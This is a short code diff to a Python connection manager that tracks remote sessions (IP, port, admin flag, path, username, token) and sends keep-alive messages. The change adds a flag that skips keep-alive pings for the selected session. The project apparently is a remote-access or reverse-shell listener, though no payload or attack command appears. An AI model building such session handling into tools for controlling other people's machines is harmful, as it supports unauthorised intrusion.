@@ -7,7 +7,7 @@ from prettytable import PrettyTable
 from .handler import Handler
 from .sql import Sql
 from .other import printColor
-from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SOCK_TIMEOUT
+from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT
 
 
 class Management(threading.Thread):
@@ -29,13 +29,16 @@ class Management(threading.Thread):
             time.sleep(self.timeout)
             for key in Handler.dict_conn.keys():
                 #print(list(enumerate(Handler.dict_conn[0])))
+                
+                
                 if(Handler.dict_conn[key][NB_ALIVE] ==True and Handler.dict_conn[key][NB_SOCKET] ==False):
                     print("\n\n\nChange value Is he alive true to false.")
                     Handler.dict_conn[key][NB_ALIVE] = False
 
                 #print("TEST SOCK--->",bool(Handler.dict_conn[key][NB_SOCKET]))
+                
+                if(Handler.dict_conn[key][NB_ALIVE] and bool(Handler.dict_conn[key][NB_SOCKET]) and not Handler.dict_conn[key][NB_SELECT]): #If the connection is alive (True) and the socket object is active (True)
 
-                if(Handler.dict_conn[key][NB_ALIVE] and bool(Handler.dict_conn[key][NB_SOCKET])): #If the connection is alive (True) and the socket object is active (True)
                     try:
                         Handler.dict_conn[key][NB_SOCKET].send(Management.is_life.encode())
                         #print(Handler.dict_conn[key][8])
@@ -60,6 +63,9 @@ class CheckConn:
         Handler.dict_conn[nb_session][NB_ALIVE] = False
         Handler.dict_conn[nb_session][NB_SOCKET] = False
         Handler.dict_conn[nb_session][NB_PORT] = "---"
+
+        Handler.dict_conn[nb_session][NB_SELECT] = False #test
+
         #self.NewObjSql.updateValue("is_he_alive","False",nb_session,True) #Faut-il changer les valeurs de la db en temps reel ? Ou changer les valeurs lors de l'inialisation du script ?
         #self.NewObjSql.closeConn()
         
